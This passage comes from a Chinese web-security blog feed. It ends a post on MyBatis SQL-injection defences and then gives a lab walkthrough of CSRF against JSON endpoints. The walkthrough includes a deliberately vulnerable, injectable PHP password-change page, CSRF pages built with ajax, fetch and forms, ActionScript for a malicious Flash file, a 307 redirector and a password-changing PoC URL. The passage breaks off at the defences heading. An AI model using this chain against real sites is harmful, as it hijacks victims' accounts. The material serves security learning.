title="存储过程"></a>存储过程</h1><p>除了预编译，还有另一种方式防止注入：<strong>存储过程</strong>。原理还是提前设定并编译好sql语句集，之后写入参数时调用就可以了。</p><p>还是以mybatis为例。</p><p>先创建存储过程。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> getUserName(<span class="keyword">in</span> u_name <span class="type">varchar</span>(<span class="number">20</span>))</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>u_name;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210714131212.png"></p><p>修改对应的DAO、mapper。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SecurityMapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Security <span class="title function_">getUserName</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.inject.dao.SecurityMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserName&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.inject.pojo.Security&quot;</span>&gt;</span></span><br><span class="line">        &#123;call getUserName(#&#123;username,mode=IN&#125;)&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，同样使用到了占位符?，强行指定写入参数为字符串，注入攻击没有生效。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Security</span> <span class="variable">security</span> <span class="operator">=</span> mapper.getUserName(<span class="string">&quot;Dumb&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202108190909895.png" alt="image-20210819090839108"></p><h1 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h1><p>1.当传参涉及到表名或列名时，如<strong>order by</strong>或者<strong>group by</strong>只能使用${}，因为在预编译的时候，预处理器会先判断表名列名是否存在，那这里就需要的是具体值而不是?了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.inject.pojo.Security&quot;</span>&gt;</span></span><br><span class="line">    select * from users order by</span><br><span class="line">    $&#123;username&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Security&gt; security = mapper.listAll(<span class="string">&quot;username&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202108190914888.png" alt="image-20210819091342485"></p><p>换成#{}则会失效。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210718141042.png" alt="image-20210718141035704"></p><p>同理，order by后要是动态传入asc&#x2F;desc参数排序的话，也是没办法用占位符的，需要用$，那这样就存在注入的风险。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202108171846346.png" alt="image-20210817184628567"></p><p>解决这类问题的话可以用映射的方式，限制用户前端选择a或b，后段分别映射成1或2，如果提交c，那么后端默认选择1。</p><p>2.模糊查询<strong>like</strong>关键字后不能直接使用#，因为预处理编译器在处理时，接受数据部分引号内的?不算作占位符，避免和正常的?字符混淆。所以很多人会选择使用$拼接。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.inject.pojo.Security&quot;</span>&gt;</span></span><br><span class="line">    select * from users</span><br><span class="line">    WHERE username like &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202108190916551.png" alt="image-20210819091548052"></p><p>有效的like预编译可以采用concat函数拼接#：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.inject.pojo.Security&quot;</span>&gt;</span></span><br><span class="line">    select * from users</span><br><span class="line">    WHERE username like CONCAT(&#x27;%&#x27;, #&#123;username&#125;, &#x27;%&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202108171522788.png" alt="image-20210817151223043"></p><p>3.根据Dao层方法参数类型的不同，如果是list、array、map或者@param参数绑定，在使用<strong>in</strong>查询时要注意是否采用了$直接拼接的情况，而且in后并不支持直接跟?，需要采用foreach循环遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SecurityMapper</span> &#123;</span><br><span class="line">    List&lt;Security&gt; <span class="title function_">listAll</span><span class="params">(List&lt;String&gt; username)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.inject.pojo.Security&quot;</span>&gt;</span></span><br><span class="line">    select * from users where username in</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">item</span>=<span class="string">&quot;name&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">            #&#123;name&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; username = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">username.add(<span class="string">&quot;Dumb&quot;</span>);</span><br><span class="line">username.add(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">List&lt;Security&gt; list = mapper.listAll(username);</span><br><span class="line"><span class="keyword">for</span> (Security security : list) &#123;</span><br><span class="line">    System.out.println(security);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202108190849330.png" alt="image-20210819084928565"></p><h1 id="预编译失效的情况"><a href="#预编译失效的情况" class="headerlink" title="预编译失效的情况"></a>预编译失效的情况</h1><p>有时候在预编译的情况下，输入%或者单独拼接%可以查出所有数据，我觉得在数据量庞大的情况下顶多可能造成cc攻击造成服务器卡顿，没有啥特别大的危害，又不能搞出数据&#x3D;&#x3D;</p><p>其他的情况还没研究。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/yizhenn/article/details/52384601?utm_source=app&amp;app_version=4.5.8">https://blog.csdn.net/yizhenn/article/details/52384601?utm_source=app&amp;app_version=4.5.8</a></p><p><a href="https://blog.csdn.net/dwenxue/article/details/82257944">https://blog.csdn.net/dwenxue/article/details/82257944</a></p><p><a href="https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be">https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
            <tag> 预编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Json格式csrf利用</title>
      <link href="/2021/07/25/8cbb170f.html"/>
      <url>/2021/07/25/8cbb170f.html</url>
      
        <content type="html"><![CDATA[<h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>老生常谈。首先，服务端有可能会校验Content-Type，需要自定义Content-Type为application&#x2F;json后请求，其次，构造html发送json数据方法虽说比较多，javascript、ajax、fetch都可以，但基本都无法跨域，需要利用flash跨域+http 307跳转。</p><h1 id="307状态码"><a href="#307状态码" class="headerlink" title="307状态码"></a>307状态码</h1><p>服务端在响应客户端发送的post请求返回307时，浏览器会询问是否继续用post，这样可以保证重定向后请求方法和请求数据不会变化。</p><h1 id="配置漏洞点"><a href="#配置漏洞点" class="headerlink" title="配置漏洞点"></a>配置漏洞点</h1><p>简单的修改密码页面。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>) &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>], <span class="string">&#x27;application/json&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  <span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="variable">$json</span>-&gt;username;</span><br><span class="line">  <span class="variable">$password</span> = <span class="variable">$json</span>-&gt;password;</span><br><span class="line">  <span class="variable">$newpassword</span> = <span class="variable">$json</span>-&gt;newpassword;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$link</span> = <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;security&#x27;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;UPDATE users set password = &#x27;%s&#x27; WHERE username = &#x27;%s&#x27; AND password = &#x27;%s&#x27;&quot;</span>, <span class="variable">$newpassword</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="variable">$link</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;修改成功！&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$query2</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM users WHERE username = &#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$result2</span> = <span class="variable">$link</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query2</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span>=<span class="variable">$result2</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;修改失败！&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;请求失败！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ajax-x2F-fetch-x2F-js"><a href="#ajax-x2F-fetch-x2F-js" class="headerlink" title="ajax&#x2F;fetch&#x2F;js"></a>ajax&#x2F;fetch&#x2F;js</h1><p>ajax。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">style</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">submitRequest</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://xxxxxxx&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=utf-8&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;666&quot;</span>,<span class="string">&quot;newpassword&quot;</span>:<span class="string">&quot;888&quot;</span>&#125;));</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> <span class="attr">onClick</span>=<span class="string">&quot;submitRequest()&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果服务端没有配置允许任意跨域的话，ajax在发送第一个options预检请求后就会被拒绝，post请求没被发送。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210725193536.png" alt="image-20210722224946904"></p><p>fetch情况类似，options预检后被拒绝。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://xxxxxxxxxxxxxxx&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript">      <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript">      <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;, </span></span><br><span class="line"><span class="language-javascript">      <span class="attr">body</span>: <span class="string">&#x27;&#123;&quot;username&quot;:&quot;Dumb&quot;,&quot;password&quot;:&quot;666&quot;,&quot;newpassword&quot;:&quot;888&quot;&#125;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建form表单用js来模拟发送json对象。</p><p>新的版本w3c废弃了enctype&#x3D;”application&#x2F;json”特性。用enctype&#x3D;”text&#x2F;plain”json数据也可以被服务端接受，但要是校验header头的话依旧不行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/json&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://xxxxxxxxxxxxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;json&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;json&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;666&quot;&#125;&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      $(<span class="string">&quot;#json&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&#x27;&#123;&quot;username&quot;:&quot;Dumb&quot;,&quot;password&quot;:&quot;888&quot;,&quot;newpassword&quot;:&quot;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&quot;#myform&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>试了一下，就算配置了enctype&#x3D;”application&#x2F;json”最后请求时会强制变成application&#x2F;x-www-form-urlencoded。但是可以跨域。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210725193554.png" alt="image-20210725143154776"></p><h1 id="flash跨域-307跳转"><a href="#flash跨域-307跳转" class="headerlink" title="flash跨域+307跳转"></a>flash跨域+307跳转</h1><p>flash的header其实存在黑名单，比如referer，只是Content-Type不在里面。</p><p>整个的思路是：</p><ol><li>受害者点击钓鱼页面加载恶意的flash文件，随后自动向攻击者服务器上的重定向页面发送包含自定义Content-Type的post请求。</li><li>重定向页面进行307响应，并将location设置为csrf漏洞点的地址。</li><li>最后受害者浏览器会携带重定向前完整的请求方法和请求体访问目标地址，完成攻击。</li></ol><p>ps：如果flash文件和重定向文件不在同一服务器，需要跨域，则flash文件需要先访问crossdomain.xml，再重定向。</p><h2 id="创建flash文件"><a href="#创建flash文件" class="headerlink" title="创建flash文件"></a>创建flash文件</h2><ol><li>安装flex sdk，需要32位的jre环境。</li><li>创建文本文件csrf.as，替换其中的json数据、攻击者服务器ip等信息。</li><li>编译生成csrf.swf。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mxmlc csrf.as</span><br></pre></td></tr></table></figure><p>参考大佬的as代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">import</span> flash.display.Sprite;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLLoader;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLRequest;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLRequestHeader;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLRequestMethod;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">csrf</span> <span class="keyword">extends</span> <span class="title class_">Sprite</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">public</span> function <span class="title function_">csrf</span><span class="params">()</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">super</span>();</span><br><span class="line">         <span class="keyword">var</span> myJson:String = <span class="built_in">this</span>.root.loaderInfo.parameters.jsonData;</span><br><span class="line">         <span class="keyword">var</span> url:String = <span class="built_in">this</span>.root.loaderInfo.parameters.php_url;</span><br><span class="line">         <span class="keyword">var</span> url1:String = <span class="built_in">this</span>.root.loaderInfo.parameters.url1;</span><br><span class="line">         <span class="keyword">var</span> ct:String = !!<span class="built_in">this</span>.root.loaderInfo.parameters.ct?<span class="built_in">this</span>.root.loaderInfo.parameters.ct:<span class="string">&quot;application/json&quot;</span>;</span><br><span class="line">         <span class="keyword">var</span> request:URLRequest = <span class="keyword">new</span> <span class="title class_">URLRequest</span>(url + <span class="string">&quot;?url1=&quot;</span> + url1);</span><br><span class="line">         request.requestHeaders.push(<span class="keyword">new</span> <span class="title class_">URLRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,ct));</span><br><span class="line">         request.data = myJson;</span><br><span class="line">         request.method = URLRequestMethod.POST;</span><br><span class="line">         <span class="keyword">var</span> urlLoader:URLLoader = <span class="keyword">new</span> <span class="title class_">URLLoader</span>();</span><br><span class="line">         <span class="keyword">try</span></span><br><span class="line">         &#123;</span><br><span class="line">            urlLoader.load(request);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">catch</span>(e:Error)</span><br><span class="line">         &#123;</span><br><span class="line">            trace(e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210725193600.png" alt="image-20210723203946091"></p><h2 id="创建重定向文件"><a href="#创建重定向文件" class="headerlink" title="创建重定向文件"></a>创建重定向文件</h2><p>test.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url1&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$url1</span>&quot;</span>, <span class="literal">true</span>, <span class="number">307</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>也可以利用python，参考：</p><p><a href="https://github.com/appsecco/json-flash-csrf-poc">https://github.com/appsecco/json-flash-csrf-poc</a></p><h2 id="构造poc执行"><a href="#构造poc执行" class="headerlink" title="构造poc执行"></a>构造poc执行</h2><p>成功率受浏览器版本、安全策略、flash组件影响，试了好几次才成&#x3D;_&#x3D;</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxxxxxxxxx/practice/csrf/json/csrf.swf?jsonData=&#123;&quot;username&quot;:&quot;Dumb&quot;,&quot;password&quot;:&quot;666&quot;,&quot;newpassword&quot;:&quot;888&quot;&#125;&amp;php_url=http://xxxxxxxxxxxxxxxx/practice/csrf/json/test.php&amp;url1=http://xxxxxxxxxxxxxxxxx/practice/csrf/json/update.php&amp;ct=application/json</span><br></pre></td></tr></table></figure><p>执行flash，链接到php文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210725193605.png" alt="abda43ce89f28917d9cfd47581540e9"></p><p>经过307跳转后实现攻击。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210725193609.png" alt="image-20210725191404498"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210725193613.png" alt="image-20210725191536288"></p><h1 id="一般的防护手段"><a href="#一般的防护手段" class="headerlink" 